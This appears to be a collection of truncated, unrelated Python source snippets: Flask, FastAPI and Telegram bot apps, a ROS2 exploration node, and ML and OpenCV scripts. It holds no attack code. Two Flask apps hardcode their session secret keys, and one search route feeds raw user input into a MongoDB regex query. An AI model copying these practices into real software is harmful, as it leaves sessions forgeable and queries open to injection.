    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# --------------------------------------------------\n# Imports\n# --------------------------------------------------\n\nfrom flask import Flask, render_template, request, session, flash, make_response, redirect, url_for\n\nimport datetime\nimport nltk\nimport os\nimport pymongo\nimport sys\n\nimport utils\n\n# --------------------------------------------------\n# Init\n# --------------------------------------------------\n\n# nltk.download('punkt')\nroot = os.path.dirname(__file__)\n\n# load configuration file\nconfig = utils.loadConfig(root+'/config/config.yml')\n\n# setup flask application\napp = Flask(__name__)\napp.config['SECRET_KEY'] = 'super secret key you will never guess'\napp.config['STATIC_FOLDER'] = 'static'\napp.config['PROJECTS'] = []\napp.config['app'] = config['app']\n\n@app.template_filter('fromtimestamp')\ndef _filter_fromtimestamp(ts):\n    dt = datetime.datetime.fromtimestamp(ts)\n    return dt\n\n# Database connector to Mongo\nmongo = pymongo.MongoClient(\n    host = config['mongo']['host'],\n    port = config['mongo']['port'],\n    serverSelectionTimeoutMS = config['mongo']['timeout']\n)\n\ntry:\n    mongo.list_databases()\nexcept Exception as e:\n    print('[ERROR] could not connect to mongo database',file=sys.stderr)\n    sys.exit(1)\n\n# setup NLTK\nnltk.data.path.append(root+'/../nltk_data/')\n\n# initialize projects\napp.config['PROJECTS'] = utils.initProjects(mongo,root+'/config/projects')\n\n# --------------------------------------------------\n# Decorators\n# --------------------------------------------------\n\n@app.before_request\ndef before_request_func():\n\n    if not 'project' in session:\n        session['project'] = 'default'\n\n    global db\n    \n    db = mongo['cybint_{}'.format(session['project'])]\n\n    # make sure not handling calls to static path\n    if (request.path).split('/')[1] != app.config['STATIC_FOLDER'] :\n\n        # check if database ping is ok\n        try:\n            with pymongo.timeout(3):\n                db.command('ping')\n        # if connection fails then display error page \n        except pymongo.errors.ConnectionFailure:\n            return render_template('error.jinja',message='Error connecting to Mongo database')\n    \n# --------------------------------------------------\n# Routes\n# --------------------------------------------------\n\n#\n# Index\n#\n@app.route('/')\ndef index():\n\n    items = []\n    for obj_a in db['articles'].find().limit(5).sort('__imported',pymongo.DESCENDING):\n        items.append(obj_a)\n\n    # return redirect(url_for('feeds'))\n    return render_template('index.jinja',data=items)\n\n#\n# Error\n#\n@app.route('/error')\ndef error():\n    message = request.args.get('message')\n    return render_template('error.jinja',message=message)\n\n#\n# Projects\n#\n@app.route('/projects/')\n@app.route('/projects/<id>')\ndef projects(id=None):\n\n    # set project into session\n    if id and id.isalnum():\n        if id in app.config['PROJECTS']:\n            session['project'] = id\n            return {'status':'set'}\n        else:\n            session['project'] = 'default'\n            return {'status':'error'}\n    # return projects\n    else:\n        return app.config['PROJECTS']\n\n#\n# Feeds\n#\n@app.route('/feeds',methods=['GET','PUT','DELETE'])\ndef feeds():\n    \n    # Get feeds\n    if request.method == 'GET':\n\n        items = []\n\n        keys = db['feeds'].find().sort('id',pymongo.ASCENDING)\n        for obj in keys:\n\n            articles = db['articles'].find({'__feed':obj['id']})\n            obj['articles'] = len(list(articles))\n\n            items.append(obj)\n\n        return render_template('feeds.jinja',data=items)\n\n    # Set feed as active\n    if request.method == 'PUT':\n\n        id = request.json['id']\n        db['feeds'].update_one({'id':id},{'$set':{'enable':True}})\n\n        return {'status':'set'}\n\n    # Unset active feed \n    if request.method == 'DELETE':\n\n        id = request.json['id']\n        db['feeds'].update_one({'id':id},{'$set':{'enable':False}})\n\n        return {'status':'unset'}\n\n#\n# Articles\n#\n@app.route('/articles',methods=['GET'])\ndef articles():\n\n    word = request.args.get('keyword')\n    feed = request.args.get('feed')\n\n    items = []\n    for obj_a in db['articles'].find().sort('__imported',pymongo.DESCENDING):\n\n        # if searching by word, skip articles not matching\n        if word and obj_a['title'].lower().find(word.lower())==-1:\n            continue\n\n        # if searching by feed, skip articles not matching\n        if feed and obj_a['__feed']!=feed:\n            continue\n\n        items.append(obj_a)\n\n    return render_template('articles.jinja',data=items)\n\n#\n# Search (TODO)\n#\n@app.route('/search',methods=['GET'])\ndef search():\n\n    keyword = request.args.get('q')\n\n    results = db['articles'].find(\n        {'$or':[\n            {'title':{'$regex':keyword,'$options':'i'}},\n            {'summary':{'$regex':keyword,'$options':'i'}}\n        ]}).sort('__imported',pymongo.DESCENDING)\n\n    items = []\n    for obj_a in results:\n        items.append(obj_a)\n\n    re",
    "from typing import Dict\n\nimport numpy as np\nimport math as ma\nimport random\n\nimport rclpy\nfrom rclpy.node import Node\nfrom rclpy.duration import Duration\n\nfrom tf2_ros.buffer import Buffer\nfrom tf2_ros.transform_listener import TransformListener\n\nfrom geometry_msgs.msg import PoseStamped, Point\nfrom nav_msgs.msg import OccupancyGrid\nfrom nav_msgs.msg import Odometry\nfrom visualization_msgs.msg import Marker, MarkerArray\nfrom nav2_simple_commander.robot_navigator import BasicNavigator, TaskResult\n\nfrom .utils import get_transform, transform\n\ncoords = tuple[int, int]\n\n\ndef __from_np_to_tuple__(nparray):\n    return nparray[0, 0], nparray[1, 0]\n\n\nclass RRTTree:\n\n    def __init__(self, init_pose, init_visible):\n        self.edges: Dict[coords, list[coords]] = {__from_np_to_tuple__(init_pose): []}\n        self.gain: Dict[coords, float] = {__from_np_to_tuple__(init_pose): init_visible}\n\n    def get_vertices(self) -> \"np.array\":\n        vertices = list(self.edges.keys())\n        result = np.zeros((2, len(vertices)))\n\n        for i, vertex in enumerate(vertices):\n            result[0, i] = vertex[0]\n            result[1, i] = vertex[1]\n\n        return result\n\n    def connect_new_point(self, a, b, visible):\n        \"\"\"\n        Connect a to b. a is an existing point, b is a new one\n\n        param a: coords\n        param b: coords\n        param visible: the visible score in the gain\n        \"\"\"\n\n        self.edges[__from_np_to_tuple__(a)].append(__from_np_to_tuple__(b))\n        self.edges[__from_np_to_tuple__(b)] = []\n        self.gain[__from_np_to_tuple__(b)] = self.gain[__from_np_to_tuple__(a)] + visible\n\n        return self.gain[__from_np_to_tuple__(b)]\n\n    def print(self, logger):\n        for ele in self.edges:\n            logger(f\"{ele} ({self.gain[ele]:.1f}): {';'.join([f'{name}' for name in self.edges[ele]])}\")\n\n\nclass NBVNode(Node):\n    \"\"\"\n    The node executing the Next Best View algorithm to find the next point to go to\n    \"\"\"\n\n    def __init__(self):\n        super().__init__(\"homemade_nbv\")\n        self.map_sub = self.create_subscription(OccupancyGrid, \"/map\", self.listener_callback, 10)\n        self.odom = self.create_subscription(Odometry, \"/odom\", self.odom_callback, 10)\n        self.marker = self.create_publisher(MarkerArray, \"/rrt_tree\", 10)\n        self.nav = BasicNavigator()\n\n        initial_pose = PoseStamped()\n        initial_pose.header.frame_id = 'map'\n        initial_pose.header.stamp = self.get_clock().now().to_msg()\n        self.nav.setInitialPose(initial_pose)\n\n        self.tf_buffer = Buffer()\n        self.tf_listener = TransformListener(self.tf_buffer, self)\n\n        self.map = None\n        self.raw_map = None\n        self.rrt_d = 0.7  # m\n        self.rrt_Nmax = 15\n        self.nbv_lambda = 1\n        self.lidar_max_range = 3.5  # m\n\n        self.robot_pose = None\n\n        self.should_send_next_goal = False\n\n        self.get_logger().info(\"Waiting for Nav2 server\")\n        self.nav.waitUntilNav2Active(localizer=\"bt_navigator\")\n        self.get_logger().info(\"Nav2 server ready\")\n        self.should_send_next_goal = True\n        self.timer = self.create_timer(5, self.timer_callback)\n\n    def timer_callback(self):\n        if self.map is None or self.robot_pose is None or not self.should_send_next_goal:\n            return\n\n        # Check if last was completed\n        if not self.nav.isTaskComplete():\n            feedback = self.nav.getFeedback()\n            if Duration.from_msg(feedback.navigation_time) > Duration(seconds=30.0):\n                self.nav.cancelTask()\n        else:\n            # if finished print result\n            result = self.nav.getResult()\n            if result == TaskResult.SUCCEEDED:\n                self.get_logger().info('Goal succeeded!')\n            elif result == TaskResult.CANCELED:\n                self.get_logger().info('Goal was canceled!')\n            elif result == TaskResult.FAILED:\n                self.get_logger().info('Goal failed!')\n\n            # Find another goal\n            self.raw_map = np.array(self.map.data).reshape((self.map.info.height, self.map.info.width))\n            point = self.find_next_best_view()\n            self.get_logger().info(f\"Next best view suggest to go at {point.T}\")\n\n            goal_pose = PoseStamped()\n            goal_pose.header.frame_id = 'map'\n            goal_pose.header.stamp = self.nav.get_clock().now().to_msg()\n            goal_pose.pose.position.x = point[0, 0]\n            goal_pose.pose.position.y = point[1, 0]\n            goal_pose.pose.position.z = 0.0\n            goal_pose.pose.orientation.x = 0.0\n            goal_pose.pose.orientation.y = 0.0\n            goal_pose.pose.orientation.z = 0.0\n            goal_pose.pose.orientation.w = 1.0\n            self.nav.goToPose(goal_pose)\n\n    def from_world_to_coordinates(self, pose):\n        coord = (\n            int(\n                (pose[1, 0] - self.map.info.origin.position.y)\n                / self.map.info.resolution\n            ),\n            int(\n                (pose[",
    "from datetime import date\nfrom flask import Flask, redirect, url_for, render_template, request, session\nfrom src.game import Thesaurdle\nfrom src.exceptions import InvalidGuess, RepeatGuess\n\n\napp = Flask(__name__)\n\nimport jinja2\n\napp.jinja_env.filters[\"zip\"] = zip  # add zip()\nenv = jinja2.Environment()\nenv.globals.update(zip=zip)\napp.secret_key = \"KEY123ABCMUADDIB\"\n\ntodaydate = date.today().strftime(\"%A, %B %-d %Y\")\ndifficulty: str = \"Hard\"  # placeholder in case something fails\nlives: int = 4\n\n\n@app.route(\"/\")\ndef landing():\n    session.clear()\n    return render_template(\"landing.html\", date=todaydate)\n\n\n@app.route(\"/select\", methods=[\"POST\"])\ndef select():\n    global game\n    if request.method == \"POST\":\n        difficulty = request.form[\"difficulty\"]\n        game = Thesaurdle(difficulty=difficulty)\n        if \"game_state\" not in session:\n            session[\"game_state\"] = {\n                \"init_hint\": game.initial_hint(game.answer.word),\n                \"lives_remaining\": int(lives),\n                \"guess_count\": 0,\n                \"answer\": game.answer.word,\n                \"answer_complexity\": int(game.answer.complexity),\n                \"answer_part_of_speech\": game.answer.part_of_speech,\n                \"answer_len\": int(game.answer.length),\n                \"formatted_answer\": game.formatted_answer,\n                \"difficulty\": difficulty,\n                \"guesses\": [],\n                \"hints\": [],\n                \"guess_feedback\": {},\n            }\n        return render_template(\n            \"index.html\",\n            lives=session[\"game_state\"][\"lives_remaining\"],\n            guess_count=session[\"game_state\"][\"guess_count\"],\n            init_hint=session[\"game_state\"][\"init_hint\"],\n            date=todaydate,\n            difficulty=session[\"game_state\"][\"difficulty\"],\n        )\n\n\n@app.route(\"/restart\", methods=[\"GET\"])\ndef restart():\n    session.clear()\n    return redirect(url_for(\"landing\"))\n\n\n@app.route(\"/guess\", methods=[\"POST\", \"GET\"])\ndef process_guess():\n    if \"lives_remaining\" not in session:\n        session[\"lives_remaining\"] = 4\n    if \"guess_count\" not in session:\n        session[\"guess_count\"] = 0\n    print(session[\"game_state\"][\"difficulty\"], session[\"game_state\"][\"answer\"])\n    invalid_guess = False\n    if request.method == \"POST\":\n        g = request.form[\"guess\"]\n        try:\n            game = Thesaurdle(difficulty=session[\"game_state\"][\"difficulty\"])\n            game.init_hint = session[\"game_state\"][\"init_hint\"]\n            game.answer.word = session[\"game_state\"][\"answer\"]\n            game.answer.complexity = session[\"game_state\"][\"answer_complexity\"]\n            guess_feedback = []\n            game.guess(g)\n            if game.current_guess in session[\"game_state\"][\"guesses\"]:\n                raise RepeatGuess\n            session[\"game_state\"][\"guesses\"].append(game.current_guess)\n            session[\"game_state\"][\"last_guess\"] = game.current_guess\n            session[\"game_state\"][\"hints\"].append(game.guess_hint)\n            session[\"game_state\"][\"last_guess_hint\"] = game.guess_hint\n            session[\"game_state\"][\n                \"last_guess_part_of_speech\"\n            ] = game.guess_part_of_speech\n            # assess part of speech\n            if (\n                session[\"game_state\"][\"answer_part_of_speech\"]\n                in session[\"game_state\"][\"last_guess_part_of_speech\"]\n            ):\n                guess_feedback.append(2)\n            else:\n                guess_feedback.append(0)\n            session[\"game_state\"][\"last_guess_lendiff\"] = int(game.lendiff)\n            # assess lendiff\n            if session[\"game_state\"][\"last_guess_lendiff\"] == 0:\n                guess_feedback.append(2)\n            elif session[\"game_state\"][\"last_guess_lendiff\"] in [1, 2]:\n                guess_feedback.append(1)\n            else:\n                guess_feedback.append(0)\n            session[\"game_state\"][\"last_guess_word_len\"] = int(game.guess_word_len)\n            session[\"game_state\"][\"last_guess_complexity\"] = game.guess_complexity\n            session[\"game_state\"][\"last_guess_compdiff\"] = int(game.compdiff)\n            # assess compdiff\n            if int(session[\"game_state\"][\"last_guess_compdiff\"]) == 0:\n                guess_feedback.append(2)\n            elif int(session[\"game_state\"][\"last_guess_compdiff\"]) in [1, 2]:\n                guess_feedback.append(1)\n            else:\n                guess_feedback.append(0)\n            session[\"game_state\"][\"last_guess_sim\"] = game.guess_sim\n            session[\"game_state\"][\"last_guess_sim_num\"] = int(\n                game.guess_sim_num.strip(\".\")\n            )\n            # assess sim num\n            if session[\"game_state\"][\"last_guess_sim_num\"] == 5:\n                guess_feedback.append(2)\n            elif session[\"game_state\"][\"last_guess_sim_num\"] == 4:\n                guess_feedback.append(1)\n            else:\n                guess_feedback.append(0)\n            session[\"game_state\"][\"guess_feedback\"][\n           ",
    "import torch\nimport torch.nn as nn\nimport torch.optim as optim\nimport argparse\nfrom torchvision import datasets, transforms\nfrom torchvision import models\nfrom utils.DinoModel import DinoModel, dino_args\nfrom utils.ChestXRayDataset import ChestXRayDataset\nfrom utils.Caltech101Dataset import Caltech101Dataset\nfrom utils.CIFAR100Dataset import CIFAR100Dataset\nfrom utils.CIFAR10Dataset import CIFAR10Dataset\nfrom utils import utils\nfrom utils.utils import NpEncoder\nimport time\nimport os\nimport json\nimport numpy as np\nimport faiss\nimport timm\n\n\n# Define the student model for knowledge distillation\nclass StudentModel(nn.Module):\n    def __init__(self, num_features=384):\n        super(StudentModel, self).__init__()\n        self.efficientnet = models.efficientnet_b0(weights=None)\n        # self.efficientnet.classifier[-1].out_features = num_features\n        self.efficientnet.classifier = torch.nn.Sequential(\n            nn.Dropout(p=0.2, inplace=True),\n            nn.Linear(in_features=1280, out_features=num_features, bias=True)\n        )\n        \"\"\"\n        self.efficientnet.classifier =  Sequential(\n        (0): Dropout(p=0.2, inplace=True)\n        (1): Linear(in_features=1280, out_features=1000, bias=True) # Replaced 1000 by 384\n        )\n        \"\"\"\n\n    def forward(self, x):\n        x = self.efficientnet(x)\n        return x\n\n# Define the student model for knowledge distillation\nclass StudentModel(nn.Module):\n    def __init__(self, num_features=384):\n        super(StudentModel, self).__init__()\n        self.efficientnet = models.efficientnet_v2_s(weights=None)\n        # self.efficientnet.classifier[-1].out_features = num_features\n        self.efficientnet.classifier = torch.nn.Sequential(\n            nn.Dropout(p=0.2, inplace=True),\n            nn.Linear(in_features=1280, out_features=num_features, bias=True)\n        )\n        \"\"\"\n        self.efficientnet.classifier =  Sequential(\n        (0): Dropout(p=0.2, inplace=True)\n        (1): Linear(in_features=1280, out_features=1000, bias=True) # Replaced 1000 by 384\n        )\n        \"\"\"\n\n    def forward(self, x):\n        x = self.efficientnet(x)\n        return x\n    \n\nif __name__==\"__main__\":\n\n\n    parser = argparse.ArgumentParser('Efficient DINO')\n    parser.add_argument('--learning_rate',\n                        type=float, default=0.01,\n                        help='Initial learning rate.')\n    parser.add_argument('--num_epochs',\n                        type=int,\n                        default=100,\n                        help='Number of epochs to run trainer.')\n    parser.add_argument('--batch_size',\n                        type=int, default=32,\n                        help='Batch size. Must divide evenly into the dataset sizes.')\n    parser.add_argument('--log_dir',\n                        type=str,\n                        default='DINO',\n                        help='Directory to put logging.')\n    parser.add_argument('--mode',\n                        type=str,\n                        default=\"train\",\n                        help='type of mode train or test')\n    parser.add_argument('--dino_base_model_weights',\n                        type=str,\n                        default=\"./models/pretrains/dino_deitsmall8_pretrain_full_checkpoint.pth\",\n                        help='dino based model weights')\n    parser.add_argument('--dino_custom_model_weights',\n                        type=str,\n                        default=\"./weights/dinoxray/checkpoint.pth\",\n                        help='dino based model weights')\n    parser.add_argument('--efficient_distilled_model_weights',\n                        type=str,\n                        default=\"./weights/student_model_efficientnetv2_base_dino_v2_ds_caltech101_best_test_loss.pth\",\n                        help='efficient distilled model weights')\n    parser.add_argument('--dataset_root',\n                        type=str,\n                        default=\"./datasets/chest_xray\",\n                        help='dataset directory root')\n    parser.add_argument('--search_gallery',\n                        type=str,\n                        default=\"train\",\n                        help='dataset in which images will be searched')\n    parser.add_argument('--topK',\n                        type=int,\n                        default=5,\n                        help='Top-k paramter, defaults to 5')\n    parser.add_argument('--seed', default=0, type=int, help='Random seed.')\n    parser.add_argument('--num_workers', default=4, type=int, help='Number of data loading workers per GPU.')\n    parser.add_argument(\"--dist_url\", default=\"env://\", type=str, help=\"\"\"url used to set up\n        distributed training; see https://pytorch.org/docs/stable/distributed.html\"\"\")\n    parser.add_argument(\"--local_rank\", default=0, type=int, help=\"Please ignore and do not set this argument.\")\n\n\n    FLAGS = None\n    FLAGS, unparsed = parser.parse_known_args()\n    print(FLAGS)\n\n    \n\n    utils.init_distributed_mode(args=FLAGS)\n    device = torch.device('cuda' if",
    "# Importando bibliotecas\r\nimport cv2 as cv\r\n\r\n# Selecionando imagens\r\nimg1 = cv.imread(\"caminho_para_imagem\")\r\nimg2 = cv.imread(\"caminho_para_imagem\")\r\n\r\n# Verifica se as imagens foram lidas corretamente\r\nif img1 is None or img2 is None:\r\n    print(\"Erro ao carregar imagens.\")\r\n    exit()\r\n\r\n# Verifica se as imagens t\u00eam as mesmas dimens\u00f5es\r\nif img1.shape[:2] != img2.shape[:2]:\r\n    print(\"As imagens t\u00eam dimens\u00f5es diferentes.\")\r\n    exit()\r\n \r\n# Juntando as duas imagens lado a lado\r\nfinal_image = cv.hconcat((img1, img2))\r\n \r\n# Exibindo a imagem no colab\r\ncv.imshow(\"Imagens Concatenadas\", final_image)\r\ncv.waitKey(0)\r\ncv.destroyAllWindows()\r\n\r\n# Verificando o tipo de dados da matriz da imagem\r\nprint('Dtype da imagem1 \u00e9 {} e o Dtype da imagem2 \u00e9 {}'\r\n     .format(img1.dtype,img2.dtype))\r\n# Verificando a altura da imagem\r\nprint('A altura da imagem1 \u00e9 {} e a altura da imagem2 \u00e9 {}'\r\n     .format(img1.shape[0],img2.shape[0]))\r\n# Verificando a largura da imagem\r\nprint('A largura da imagem1 \u00e9 {} e a largura da imagem2 \u00e9 {}'\r\n     .format(img1.shape[1],img2.shape[1]))\r\n# Verificando o n\u00famero de canais da imagem\r\nprint('O n\u00famero de canais da imagem1 \u00e9 {} e o n\u00famero de canais da imagem2 \u00e9 {}'\r\n     .format(img1.shape[2],img2.shape[2]))\r\nb1, g1, r1 = cv.split(img1)\r\nb2, g2, r2 = cv.split(img2)\r\n# Verificando a cor b da imagem\r\nprint('Elementos diferente de zero na imagem1 \u00e9 de {} e na imagem2 \u00e9 de {}'\r\n     .format(cv.countNonZero(b1),cv.countNonZero(b2)))\r\n# Verificando a cor g da imagem\r\nprint('Elementos diferente de zero na imagem1 \u00e9 de {} e na imagem2 \u00e9 de {}'\r\n     .format(cv.countNonZero(g1),cv.countNonZero(g2)))\r\n# Verificando a cor r da imagem\r\nprint('Elementos diferente de zero na imagem1 \u00e9 de {} e na imagem2 \u00e9 de {}'\r\n     .format(cv.countNonZero(r1),cv.countNonZero(r2)))\r\n\r\ndef image_difference(image_1, image_2):\r\n    # Salva o shape das imagens\r\n    img1_shape = image_1.shape[:2]\r\n    img2_shape = image_2.shape[:2]\r\n    \r\n    # TESTE 1: Compara a estrutura das imagens\r\n    if img1_shape == img2_shape:\r\n        print(\"O tamanho das imagens s\u00e3o os mesmos\")\r\n        # Extrai a diferen\u00e7a de cor entre duas imagens\r\n        difference = cv.subtract(image_1, image_2)\r\n        # Separa as tr\u00eas cores da imagem\r\n        b, g, r = cv.split(difference)\r\n        # TESTE 2: Compara as cores das imagens\r\n        if cv.countNonZero(b) == 0 and cv.countNonZero(g) == 0 and cv.countNonZero(r) == 0:\r\n            print(\"As cores das imagens s\u00e3o iguais\")\r\n        else:\r\n            print('As cores das imagens s\u00e3o diferentes')\r\n    else:\r\n        print(\"As imagens t\u00eam tamanhos diferentes\")\r\n        \r\n    # Exibe a diferen\u00e7a entre as imagens\r\n    cv.imshow(\"Diferen\u00e7a entre as imagens\", difference)\r\n    cv.waitKey(0)\r\n    cv.destroyAllWindows()\r\n\r\nimage_difference(img1, img2)\r\n",
    "import database as db\nfrom telebot.types import ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton\nfrom datetime import datetime\nfrom pytz import timezone\ntz_yerevan = timezone('Asia/Yerevan')\nglobal list_hours\nglobal times\nglobal times_2\nglobal cutting_style\nglobal current_date\nglobal weekday\nglobal date_button\nregister_button = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)\nbtn1 = KeyboardButton(\"\u2705 \u0533\u0580\u0561\u0576\u0581\u057e\u0565\u056c\")\nbtn2 = KeyboardButton(\"\ud83d\udccd \u0533\u057f\u0576\u057e\u0565\u056c\u0578\u0582 \u054e\u0561\u0575\u0580\u0568\")\nbtn6 = KeyboardButton(\"\ud83e\udde1 \u053b\u0564\u0580\u0561\u0574\")\nbtn7 = KeyboardButton(\"\ud83d\udd01 \u0553\u0578\u0583\u0578\u056d\u0565\u056c \u056a\u0561\u0574\u0568\")\nbtn8 = KeyboardButton(\"\u260e\ufe0f \u0536\u0561\u0576\u0563\u0561\u0570\u0561\u0580\u0565\u056c\")\nbtn10 = KeyboardButton(\"\ud83d\udcb2 \u0563\u0576\u0561\u0581\u0578\u0582\u0581\u0561\u056f\")\nregister_button.add(btn1, btn2, btn6, btn7, btn8, btn10)\n\n\ndef forb_times_current_day():\n    db.examination_hours()\n    list_hours = [\"11:00\", \"11:30\", \"12:00\", \"12:30\", \"13:00\", \"13:30\",\n                  \"14:00\", \"14:30\", \"15:00\", \"15:30\", \"16:00\", \"16:30\",\n                  \"17:00\", \"17:30\", \"18:00\", \"18:30\", \"19:00\", \"19:30\",\n                  \"20:00\", \"20:30\", \"21:00\", \"21:30\", \"22:00\", \"22:30\"]\n    for el in db.forbidden_time:\n        try:\n            index = list_hours.index(el)\n        except ValueError:\n            continue\n        list_hours.pop(index)\n        list_hours.insert(index, f\"\u0536\u0562\u0561\u0572\u057e\u0561\u056e   {el}\")\n\n    global times\n    times = ReplyKeyboardMarkup(row_width=3)\n    for hour in range(0, len(list_hours), 3):\n        times.row(KeyboardButton(list_hours[hour]),\n                  KeyboardButton(list_hours[hour + 1]),\n                  KeyboardButton(list_hours[hour + 2]))\n    times.row(KeyboardButton(\"\u21a9\ufe0f \u054e\u0561\u0580\u0561\u0564\u0561\u057c\u0576\u0561\u056c\"))\n\n\ndef forb_times_current_day_2():\n    db.examination_hours_2()\n    list_hours = [\"11:00\", \"11:30\", \"12:00\", \"12:30\", \"13:00\", \"13:30\",\n                  \"14:00\", \"14:30\", \"15:00\", \"15:30\", \"16:00\", \"16:30\",\n                  \"17:00\", \"17:30\", \"18:00\", \"18:30\", \"19:00\", \"19:30\",\n                  \"20:00\", \"20:30\", \"21:00\", \"21:30\", \"22:00\", \"22:30\"]\n    for el in db.forbidden_time:\n        try:\n            index = list_hours.index(el)\n        except ValueError:\n            continue\n        list_hours.pop(index)\n        list_hours.insert(index, f\"\u0536\u0562\u0561\u0572\u057e\u0561\u056e   {el}\")\n\n    global times_2\n    times_2 = ReplyKeyboardMarkup(row_width=3)\n    for hour in range(0, len(list_hours), 3):\n        times_2.row(KeyboardButton(list_hours[hour]),\n                    KeyboardButton(list_hours[hour + 1]),\n                    KeyboardButton(list_hours[hour + 2]))\n    times_2.row(KeyboardButton(\"\u21a9\ufe0f \u054e\u0561\u0580\u0561\u0564\u0561\u057c\u0576\u0561\u056c\"))\n\n\nmap_button = InlineKeyboardMarkup()\nmap_button.add(InlineKeyboardButton(\"\ud83d\udccc \u0532\u0561\u0581\u0565\u056c \u0554\u0561\u0580\u057f\u0565\u0566\u0568\", url=\"https://yandex.ru/maps/116123/metsamor/?ll=44.118383%2\"\n                                                           \"C40.143820&mode=poi&poi%5Bpoint%5D=44.118468%2C40.143809&po\"\n                                                           \"i%5Buri%5D=ymapsbm1%3A%2F%2Forg%3Foid%3D220927114235&z=21\"))\n\nlst_weekdays = [\"\u0535\u0580\u056f\u0578\u0582\u0577\u0561\u0562\u0569\u056b\", \"\u0535\u0580\u0565\u0584\u0577\u0561\u0562\u0569\u056b\", \"\u0549\u0578\u0580\u0565\u0584\u0577\u0561\u0562\u0569\u056b\", \"\u0540\u056b\u0576\u0563\u0577\u0561\u0562\u0569\u056b\", \"\u0548\u0582\u0580\u0562\u0561\u0569\", \"\u0547\u0561\u0562\u0561\u0569\", \"\u053f\u056b\u0580\u0561\u056f\u056b\"]\n\n\ndef mention_timezone():\n    global current_date\n    global weekday\n    current_date = datetime.now(tz_yerevan)\n    weekday = current_date.weekday()\n    global date_button\n    date_button = ReplyKeyboardMarkup(resize_keyboard=True)\n    for day in range(current_date.day, current_date.day + 2):\n        if weekday == 0:\n            weekday = lst_weekdays[0]\n        elif weekday == 1:\n            weekday = lst_weekdays[1]\n        elif weekday == 2:\n            weekday = lst_weekdays[2]\n        elif weekday == 3:\n            weekday = lst_weekdays[3]\n        elif weekday == 4:\n            weekday = lst_weekdays[4]\n        elif weekday == 5:\n            weekday = lst_weekdays[5]\n        elif weekday == 6:\n            weekday = lst_weekdays[6]\n        elif weekday == 7:\n            weekday = lst_weekdays[0]\n        date_button.add(KeyboardButton(f\"{weekday} | {day}\"))\n        weekday = current_date.weekday() + 1\n    date_button.add(KeyboardButton(\"\u21a9\ufe0f \u054e\u0561\u0580\u0561\u0564\u0561\u057c\u0576\u0561\u056c\"))\n\n\nmain_button = ReplyKeyboardMarkup(resize_keyboard=True)\nbtn3 = KeyboardButton(\"\ud83e\udd0d \u0531\u0564\u0574\u056b\u0576 \u0540\u0561\u0580\u0569\u0561\u056f\")\nmain_button.add(btn1, btn2)\nmain_button.row(btn6, btn7)\nmain_button.row(btn8, btn3)\n\n\nadmin_panel = ReplyKeyboardMarkup(resize_keyboard=True, row_width=1)\nbtn4 = KeyboardButton(\"\ud83d\udccb \u054f\u0565\u057d\u0576\u0565\u056c \u0570\u0561\u0573\u0561\u056d\u0578\u0580\u0564\u0576\u0565\u0580\u056b \u0581\u0578\u0582\u0581\u0561\u056f\u0568\")\nbtn5 = KeyboardButton(\"\u21a9\ufe0f \u054e\u0561\u0580\u0561\u0564\u0561\u057c\u0576\u0561\u056c\")\nbtn9 = KeyboardButton(\"\ud83d\udd01 \u054e\u0565\u0580\u0561\u0561\u056f\u057f\u056b\u057e\u0561\u0581\u0576\u0565\u056c \u0581\u0578\u0582\u0581\u0561\u056f\u0568\")\nbtn11 = KeyboardButton(\"\u23f0\u0531\u057e\u0565\u056c\u0561\u0581\u0576\u0565\u056c \u0566\u0562\u0561\u0572\u057e\u0561\u056e \u056a\u0561\u0574\")\nadmin_panel.add(btn4, btn5, btn9, btn11)\n\nback_button = ReplyKeyboardMarkup(resize_keyboard=True)\nback_button.add(btn5)\n\n\ndef cut():\n    global cutting_style\n    cutting_style = InlineKeyboardMarkup(row_width=1)\n    lst_style = [\"\u0544\u0578\u0580\u0578\u0582\u0584\u056b \u0574\u0578\u0564\u0565\u056c\u0561\u057e\u0578\u0580\u0578\u0582\u0574 - 1000 \u0564\u0580\u2024\", \"\u0548\u057d\u056f (\u0544\u0561\u0566\u0561\u0570\u0565\u057c\u0561\u0581\u0578\u0582\u0574) - 1000 \u0564\u0580\u2024\", \"\u0544\u0561\u0566\u056b \u056f\u057f\u0580\u057e\u0561\u056e\u0584 - 1500 \u0564\u0580\u2024\",\n                 \"\u0544\u0561\u0566\u056b \u0546\u0565\u0580\u056f\u0578\u0582\u0574 - 1500 \u0564\u0580\u2024\", \"\u0544\u0578\u0580\u0578\u0582\u0584\u056b \u0576\u0565\u0580\u056f\u0578\u0582\u0574 - 1500 \u0564\u0580\u2024\", \"\u0534\u0565\u0574\u0584\u056b \u056d\u0576\u0561\u0574\u0584 - 2000 \u0564\u0580\u2024\",\n                 \"\u0544\u0561\u0566\u056b \u0587 \u0574\u0578\u0580\u0578\u0582\u0584\u056b \u0576\u0565\u0580\u056f\u0578\u0582\u0574 - 2000 \u0564\u0580\u2024\", \"\u0531\u056e\u0565\u056c\u056b\u0578\u057e \u057d\u0561\u0583\u0580\u0578\u0582\u0574 (\u0563\u056c\u056d\u056b) - 2000 \u0564\u0580\u2024\",\n                 \"\u0544\u0561\u0566\u056b \u0587 \u0544\u0578\u0580\u0578\u0582\u0584\u056b \u056f\u057f\u0580\u057e\u0561\u056e\u0584 - 2500 \u0564\u0580\u2024\"]\n    for el in lst_style:\n      ",
    "from fastapi import FastAPI, HTTPException\nfrom typing import List\nfrom schemas import Asset\n\napp = FastAPI()\nassets: list[Asset] = []\n\n\n@app.post(\"/assets/\", response_model=Asset)\ndef create_asset(asset: Asset):\n    asset.id = len(assets) + 1\n    assets.append(asset)\n    return asset\n\n\n@app.get(\"/assets/\", response_model=List[Asset])\ndef read_assets():\n    return assets\n\n\n@app.get(\"/assets/{asset_id}\", response_model=Asset)\ndef read_asset(asset_id: int):\n    asset = next((a for a in assets if a.id == asset_id), None)\n    if asset is None:\n        raise HTTPException(status_code=404, detail=\"Asset not found\")\n    return asset\n\n\n@app.put(\"/assets/{asset_id}\", response_model=Asset)\ndef update_asset(asset_id: int, asset_update: Asset):\n    asset = next((a for a in assets if a.id == asset_id), None)\n    if asset is None:\n        raise HTTPException(status_code=404, detail=\"Asset not found\")\n    asset.value = asset_update.value\n    return asset\n\n\n@app.delete(\"/assets/{asset_id}\", response_model=Asset)\ndef delete_asset(asset_id: int):\n    global assets\n    asset = next((a for a in assets if a.id == asset_id), None)\n    if asset is None:\n        raise HTTPException(status_code=404, detail=\"Asset not found\")\n    assets = [a for a in assets if a.id 